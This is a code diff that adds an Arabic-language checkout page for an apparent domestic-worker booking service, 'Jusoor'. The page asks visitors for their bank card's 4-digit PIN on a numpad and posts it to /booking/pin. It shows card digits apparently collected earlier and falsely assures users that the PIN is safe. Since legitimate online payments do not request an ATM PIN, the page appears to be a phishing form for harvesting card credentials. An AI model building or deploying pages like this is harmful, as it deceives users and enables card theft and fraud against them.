@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>الرقم السري — جسور</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { sans: ['Tajawal', 'Arial', 'sans-serif'] },
+                    colors: { brand: { DEFAULT: '#8B1A3A', dark: '#6B1230' } },
+                },
+            },
+        };
+    </script>
+    <style>
+        * { box-sizing: border-box; }
+        html, body {
+            min-height: 100%;
+            overflow-x: hidden;
+        }
+        body {
+            background: #f9fafb;
+            font-family: 'Tajawal', Arial, sans-serif;
+            -webkit-text-size-adjust: 100%;
+        }
+        .btn-gradient-continue {
+            background: linear-gradient(90deg, #7b113a 0%, #1a1a40 100%);
+            color: #ffffff;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,.1);
+            transition: background .2s ease;
+        }
+        .btn-gradient-continue:hover:not(:disabled) {
+            background: linear-gradient(90deg, #6a0f32 0%, #151530 100%);
+        }
+        .btn-gradient-continue:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        /* PIN display dots */
+        .pin-display {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 1.5rem 0;
+            direction: ltr;
+        }
+        .pin-dot {
+            width: 1.25rem;
+            height: 1.25rem;
+            border-radius: 9999px;
+            border: 2px solid #8B1A3A;
+            background: transparent;
+            transition: background 0.15s;
+        }
+        .pin-dot.filled {
+            background: #8B1A3A;
+        }
+        /* Numpad */
+        .numpad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0.75rem;
+            max-width: 280px;
+            margin: 0 auto;
+        }
+        .numpad-btn {
+            height: 4rem;
+            border-radius: 0.75rem;
+            border: 1.5px solid #e5e7eb;
+            background: #fff;
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #111827;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s, transform 0.1s;
+            font-family: 'Tajawal', Arial, sans-serif;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.07);
+        }
+        .numpad-btn:hover {
+            background: #f3f4f6;
+            border-color: #8B1A3A;
+        }
+        .numpad-btn:active {
+            transform: scale(0.95);
+            background: #fdf2f5;
+        }
+        .numpad-btn.delete-btn {
+            font-size: 1.1rem;
+            color: #6b7280;
+        }
+        .numpad-btn.delete-btn:hover {
+            color: #8B1A3A;
+        }
+        .numpad-btn.empty-btn {
+            background: transparent;
+            border: none;
+            box-shadow: none;
+            cursor: default;
+        }
+        .numpad-btn.empty-btn:hover {
+            background: transparent;
+            border: none;
+        }
+        /* Card mini preview */
+        .card-mini {
+            background: linear-gradient(135deg, #7b113a 0%, #1a1a40 100%);
+            border-radius: 0.75rem;
+            padding: 1rem 1.25rem;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1.5rem;
+        }
+        [x-cloak] { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header style="position:sticky;top:0;z-index:40;border-bottom:1px solid #e5e7eb;background:rgba(255,255,255,0.95);backdrop-filter:blur(4px);">
+        <div style="max-width:600px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:0.75rem 1rem;">
+            <a href="/">
+                <img src="/images/logo.png" alt="جسور" style="height:2.5rem;width:auto;">
+            </a>
+            <span style="font-size:0.875rem;color:#6b7280;">خدمات العمالة المنزلية</span>
+        </div>
+    </header>
+
+    <!-- Progress Steps -->
+    <div style="border-bottom:1px solid #f3f4f6;background:#fff;">
+        <div style="max-width:600px;margin:0 auto;padding:0.75rem 1rem;">
+            <ol style="display:flex;align-items:center;gap:0.5rem;font-size:0.8rem;flex-wrap:wrap;">
+                <li style="display:flex;align-items:center;gap:0.375rem;color:#16a34a;font-weight:600;">
+                    <span style="display:flex;height:1.5rem;width:1.5rem;align-items:center;justify-content:center;border-radius:9999px;background:#dcfce7;font-size:0.7rem;font-weight:700;">✓</span>
+                    تفاصيل الخدمة
+                </li>
+                <li style="color:#d1d5db;margin:0 0.25rem;">›</li>
+                <li style="display:flex;align-items:center;gap:0.375rem;color:#16a34a;font-weight:600;">
+                    <span style="display:flex;height:1.5rem;width:1.5rem;align-items:center;justify-content:center;border-radius:9999px;background:#dcfce7;font-size:0.7rem;font-weight:700;">✓</span>
+                    بيانات التواصل
+                </li>
+                <li style="color:#d1d5db;margin:0 0.25rem;">›</li>
+                <li style="display:flex;align-items:center;gap:0.375rem;color:#8B1A3A;font-weight:700;">
+                    <span style="display:flex;height:1.5rem;width:1.5rem;align-items:center;justify-content:center;border-radius:9999px;background:#8B1A3A;font-size:0.7rem;font-weight:700;color:#fff;">3</span>
+                    الدفع
+                </li>
+                <li style="color:#d1d5db;margin:0 0.25rem;">›</li>
+                <li style="display:flex;align-items:center;gap:0.375rem;color:#9ca3af;font-weight:500;">
+                    <span style="display:flex;height:1.5rem;width:1.5rem;align-items:center;justify-content:center;border-radius:9999px;background:#f3f4f6;font-size:0.7rem;font-weight:700;color:#9ca3af;">4</span>
+                    التأكيد
+                </li>
+            </ol>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main style="max-width:420px;margin:0 auto;padding:2rem 1rem 3rem;">
+
+        <!-- Icon + Title -->
+        <div style="text-align:center;margin-bottom:1.5rem;">
+            <div style="margin:0 auto 1rem;display:flex;height:4rem;width:4rem;align-items:center;justify-content:center;border-radius:9999px;background:rgba(139,26,58,0.1);">
+                <!-- ATM/Card icon -->
+                <svg style="height:2rem;width:2rem;color:#8B1A3A;" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z" />
+                </svg>
+            </div>
+            <h1 style="font-size:1.5rem;font-weight:700;color:#111827;margin:0 0 0.5rem;">الرقم السري للبطاقة</h1>
+            <p style="font-size:0.875rem;color:#6b7280;margin:0;">أدخل الرقم السري (PIN) المكون من 4 أرقام لبطاقتك</p>
+        </div>
+
+        <!-- Card Mini Preview -->
+        <div class="card-mini" id="cardMini">
+            <div>
+                <div style="font-size:0.7rem;opacity:0.7;margin-bottom:0.25rem;">البطاقة</div>
+                <div id="cardNumberDisplay" style="font-size:0.95rem;font-weight:600;letter-spacing:0.1rem;font-family:monospace;">**** **** **** ----</div>
+            </div>
+            <div style="text-align:left;">
+                <div style="font-size:0.7rem;opacity:0.7;margin-bottom:0.25rem;">الشبكة</div>
+                <div id="cardNetworkDisplay" style="font-size:0.85rem;font-weight:700;">VISA</div>
+            </div>
+        </div>
+
+        <!-- Error Message -->
+        <div id="error-msg" style="display:none;margin-bottom:1rem;border-radius:0.5rem;background:#fef2f2;border:1px solid #fecaca;padding:0.75rem 1rem;font-size:0.875rem;color:#b91c1c;text-align:center;"></div>
+
+        <!-- PIN Dots Display -->
+        <div class="pin-display" id="pinDots">
+            <div class="pin-dot" id="dot0"></div>
+            <div class="pin-dot" id="dot1"></div>
+            <div class="pin-dot" id="dot2"></div>
+            <div class="pin-dot" id="dot3"></div>
+        </div>
+
+        <!-- Numpad -->
+        <div class="numpad" id="numpad">
+            <button class="numpad-btn" onclick="addDigit('1')">1</button>
+            <button class="numpad-btn" onclick="addDigit('2')">2</button>
+            <button class="numpad-btn" onclick="addDigit('3')">3</button>
+            <button class="numpad-btn" onclick="addDigit('4')">4</button>
+            <button class="numpad-btn" onclick="addDigit('5')">5</button>
+            <button class="numpad-btn" onclick="addDigit('6')">6</button>
+            <button class="numpad-btn" onclick="addDigit('7')">7</button>
+            <button class="numpad-btn" onclick="addDigit('8')">8</button>
+            <button class="numpad-btn" onclick="addDigit('9')">9</button>
+            <button class="numpad-btn empty-btn"></button>
+            <button class="numpad-btn" onclick="addDigit('0')">0</button>
+            <button class="numpad-btn delete-btn" onclick="deleteDigit()">
+                <svg xmlns="http://www.w3.org/2000/svg" style="height:1.5rem;width:1.5rem;margin:auto;" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 9.75L14.25 12m0 0l2.25 2.25M14.25 12l2.25-2.25M14.25 12L12 14.25m-2.58 4.92l-6.375-6.375a1.125 1.125 0 010-1.59L9.42 4.83c.211-.211.498-.33.796-.33H19.5a2.25 2.25 0 012.25 2.25v10.5a2.25 2.25 0 01-2.25 2.25h-9.284c-.298 0-.585-.119-.796-.33z" />
+                </svg>
+            </button>
+        </div>
+
+        <!-- Hidden form -->
+        <form method="post" action="/booking/pin" id="pinForm" style="margin-top:1.5rem;">
+            <input type="hidden" name="pin" id="pinValue">
+            <button type="submit" id="submitBtn"
+                class="btn-gradient-continue"
+                style="width:100%;border-radius:0.75rem;padding:1rem;font-size:1rem;font-weight:700;border:none;cursor:not-allowed;opacity:0.6;"
+                disabled>
+                <span id="btnText">تأكيد الرقم السري</span>
+            </button>
+        </form>
+
+        <!-- Security Note -->
+        <div style="margin-top:1.5rem;display:flex;align-items:flex-start;gap:0.5rem;padding:0.75rem 1rem;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:0.75rem;">
+            <svg style="height:1.25rem;width:1.25rem;color:#16a34a;flex-shrink:0;margin-top:0.1rem;" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
+            </svg>
+            <p style="font-size:0.8rem;color:#166534;margin:0;">اتصالك آمن ومشفر. لن يتم مشاركة رقمك السري مع أي طرف ثالث.</p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer style="background:#6B1230;color:#fff;">
+        <div style="max-width:600px;margin:0 auto;padding:1.5rem 1rem;text-align:center;font-size:0.75rem;color:rgba(255,255,255,0.6);">
+            جسور — جميع الحقوق محفوظة 2026 ©
+        </div>
+    </footer>
+
+    <script>
+        let pin = '';
+        const MAX = 4;
+
+        function addDigit(d) {
+            if (pin.length >= MAX) return;
+            pin += d;
+            updateDisplay();
+        }
+
+        function deleteDigit() {
+            if (pin.length === 0) return;
+            pin = pin.slice(0, -1);
+            updateDisplay();
+        }
+
+        function updateDisplay() {
+            for (let i = 0; i < MAX; i++) {
+                const dot = document.getElementById('dot' + i);
+                if (i < pin.length) {
+                    dot.classList.add('filled');
+                } else {
+                    dot.classList.remove('filled');
+                }
+            }
+            const btn = document.getElementById('submitBtn');
+            if (pin.length === MAX) {
+                btn.disabled = false;
+                btn.style.cursor = 'pointer';
+                btn.style.opacity = '1';
+            } else {
+                btn.disabled = true;
+                btn.style.cursor = 'not-allowed';
+                btn.style.opacity = '0.6';
+            }
+        }
+
+        // Form submit
+        document.getElementById('pinForm').addEventListener('submit', function(e) {
+            document.getElementById('pinValue').value = pin;
+            const btn = document.getElementById('submitBtn');
+            document.getElementById('btnText').textContent = 'جاري التحقق...';
+            btn.disabled = true;
+        });
+
+        // Load card info from session
+        fetch('/booking/session-info')
+            .then(r => r.json())
+            .then(d => {
+                if (d.cardNumber) {
+                    const last4 = d.cardNumber.replace(/\s/g,'').slice(-4);
+                    document.getElementById('cardNumberDisplay').textContent = '**** **** **** ' + last4;
+                }
+                if (d.cardNetwork) {
+                    document.getElementById('cardNetworkDisplay').textContent = d.cardNetwork;
+                }
+            })
+            .catch(() => {});
+
+        // Check for error in URL
+        const params = new URLSearchParams(window.location.search);
+        if (params.get('error') === 'invalid') {
+            const el = document.getElementById('error-msg');
+            el.textContent = 'الرقم السري غير صحيح، يرجى المحاولة مرة أخرى';
+            el.style.display = 'block';
+            pin = '';
+            updateDisplay();
+        }
+    </script>
+</body>
+</html>
